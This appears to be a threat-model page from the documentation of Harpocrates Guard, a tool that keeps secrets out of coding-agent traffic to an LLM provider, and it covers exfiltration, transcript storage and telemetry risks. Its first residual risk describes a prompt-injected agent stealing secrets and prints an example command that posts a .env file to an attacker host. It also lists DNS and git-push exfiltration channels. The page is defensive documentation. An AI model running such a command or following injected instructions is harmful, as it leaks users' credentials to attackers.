# Threat model and residual risks

SEC-06. Harpocrates Guard protects one boundary: data leaving your machine toward the configured LLM provider. This page states what it doesn't protect, so nobody mistakes it for a sandbox. The full threat model, including the STRIDE analysis of Guard itself, is in the [design doc](design.md#threat-model).

Facts about Claude Code and Codex were checked against their documentation on Sep 30, 2026, for Claude Code 2.1.286 and Codex CLI 0.159.2.

## What is covered today

| Layer | Status | Covers |
| --- | --- | --- |
| Read tool (`safe_read`, `safe_grep`) | Shipped (M1) | Files the agent reads through it, once [setup](setup.md) denies the built-in reads |
| Egress gate | M2 | Every request to the provider, including shell output and tool results |
| Commit scanner | Shipped | Secrets on their way into git |

Until the gate ships, a secret the agent reaches by any route other than `safe_read` goes to the model. That includes `env`, test output, a stack trace, `git log -p`, or a script that prints a file.

## Residual risk 1: other exfiltration channels

**Risk.** A prompt-injected agent doesn't need to see a secret to steal it. For example, `curl -d @.env https://attacker.example` moves the file straight from disk to the attacker. The secret never enters the model's context, so neither the read tool nor the gate sees it. The same applies to:
- DNS lookups that encode data;
- `git push` to an attacker's remote;
- a secret written into a public pull request or issue;
- an MCP server or connector that makes its own network calls.

**Why Guard can't fix it.** Guard inspects content bound for the provider. Stopping this needs control of network destinations and process behavior, which is a sandbox or an EDR, not data loss prevention. It is a non-goal for v1, and the behavior sensor in the separate lab repo targets it.

**What helps:**
- **Turn on the harness's own network isolation:**
  - Claude Code's Bash sandbox, with an allowlist of network domains;
  - a Codex permission profile with `[permissions.<name>.network]` and a domain allowlist.
- **Plant canary tokens** in places an attacker would look, to detect exfiltration after the fact.

## Residual risk 2: transcripts saved to local disk with raw tool output

**Risk.** Both harnesses write every session to disk in plaintext, including raw tool output.
- **Claude Code** keeps transcripts under `~/.claude/projects/` for 30 days by default (setting: `cleanupPeriodDays`).
- **Codex** keeps sessions under `~/.codex/sessions/` and a history file at `~/.codex/history.jsonl` (setting: `history.persistence`).

The gate changes only the copy of a request sent to the provider. The harness's own transcript keeps the raw tool output, so it holds any secret the agent printed through the shell. Malware, a backup, or a synced folder that reaches those directories reaches the secrets too.

Transcripts can also leave the machine on purpose:
- Claude Code's `/feedback`, `/bug`, and `/share` upload the conversation.
- So does answering "Yes" to the optional request to share a transcript after a session quality survey.
- Anthropic's documentation says known key and token patterns are redacted before upload, and file contents are uploaded as-is.

**What Guard does.** Output from `safe_read` and `safe_grep` is already redacted when the harness records it, so files read that way are stored as placeholders. Guard's own logs hold keyed hashes, never values (SEC-01, M2).

**What helps:**
- **Shorten retention.** In Claude Code, set `cleanupPeriodDays`. In Codex, set `history.persistence = "none"`.
- **Turn off Claude Code's transcript uploads** with `DISABLE_FEEDBACK_COMMAND=1` and `CLAUDE_CODE_DISABLE_FEEDBACK_SURVEY=1`.
- **Keep secrets out of shell output** in the first place, by routing reads through `safe_read`.

## Residual risk 3: agent traffic that bypasses the API base URL

**Risk.** The gate sees only requests sent to the API base URL the harness is pointed at. Both harnesses also make other connections that never pass through it.

**Claude Code:**
- usage metrics, and on Pro and Max sign-ins, error reports (stack traces from Claude Code's own internals);
- feature-flag evaluation;
- sign-in and token refresh with Anthropic's Console auth service;
- install and update downloads;
- the WebFetch domain safety check, which sends the hostname to `api.anthropic.com`;
- `/feedback` uploads to Google Cloud Storage.

**Codex:**
- ChatGPT sign-in and token refresh with OpenAI's auth service;
- machine analytics (`analytics.enabled`);
- an optional OpenTelemetry exporter (`otel.exporter`; prompt export is opt-in through `otel.log_user_prompt`).

None of these channels is meant to carry prompt content, but Guard can't verify that. They also matter for availability: the gate can't break sign-in, because it never sees it. FR-INSTALL-05 requires the gate to forward authentication headers untouched on the requests it does see.

**What helps:**
- **Claude Code:** `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` turns off metrics, error reports, feature flags, and surveys in one switch. The WebFetch check has its own setting, `skipWebFetchPreflight`.
- **Codex:** `analytics.enabled = false`, and leave `otel.exporter` unset.
- **Verify the routing.** The planned doctor command (FR-INSTALL-02, M2) will send a canary through each harness and warn if traffic bypassed the gate.

## Also out of scope

These are listed in the design doc's non-goals:
- a malicious local user;
- general personal data;
- guaranteed detection of novel secret formats;
- harnesses that can't be routed through a local proxy at all.

For the last one, `harpocrates setup` prints each detected harness's tier. Cursor, OpenCode, and Copilot have no setup yet, and it says plainly that nothing is protected for them today.
